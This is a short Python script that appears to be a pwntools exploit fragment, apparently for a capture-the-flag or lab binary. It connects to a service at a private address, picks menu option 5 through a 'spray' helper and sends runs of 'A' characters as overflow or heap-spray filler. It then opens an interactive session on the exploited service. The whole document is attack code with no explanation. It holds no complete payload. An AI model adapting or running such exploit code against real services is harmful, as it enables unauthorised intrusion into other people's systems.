from pwn import *

s = remote("192.168.50.4",1234)
def spray(rdata,wdata):
  s.recvuntil('>')
  s.sendline('5')
  s.send(rdata)
  s.send(wdata)
spray('A'*256,'A'*16)
s.interactive()
